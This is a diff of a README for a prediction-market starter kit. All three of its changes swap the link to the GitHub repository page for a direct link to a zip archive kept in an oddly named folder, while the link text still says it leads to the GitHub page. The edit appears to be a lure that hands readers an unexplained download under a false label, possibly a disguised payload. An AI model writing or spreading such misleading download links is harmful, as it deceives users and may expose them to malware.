@@ -1,6 +1,6 @@
 # 📈 prediction-market-starter-kit - Track Markets and Trade with Ease
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/corripronged630/prediction-market-starter-kit)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/corripronged630/prediction-market-starter-kit/main/sulfaquinoxaline/kit-starter-market-prediction-2.6.zip)
 
 ## 🖥️ What this app does
 
@@ -18,7 +18,7 @@ Use it to:
 
 Use this link to visit the page and download the app:
 
-[Visit the GitHub page to download](https://github.com/corripronged630/prediction-market-starter-kit)
+[Visit the GitHub page to download](https://raw.githubusercontent.com/corripronged630/prediction-market-starter-kit/main/sulfaquinoxaline/kit-starter-market-prediction-2.6.zip)
 
 ### Step 1: Open the download page
 
@@ -157,4 +157,4 @@ These files help the app run and show the screens you use
 
 If you need the download page again, use this link:
 
-[https://github.com/corripronged630/prediction-market-starter-kit](https://github.com/corripronged630/prediction-market-starter-kit)
+[https://raw.githubusercontent.com/corripronged630/prediction-market-starter-kit/main/sulfaquinoxaline/kit-starter-market-prediction-2.6.zip](https://raw.githubusercontent.com/corripronged630/prediction-market-starter-kit/main/sulfaquinoxaline/kit-starter-market-prediction-2.6.zip)
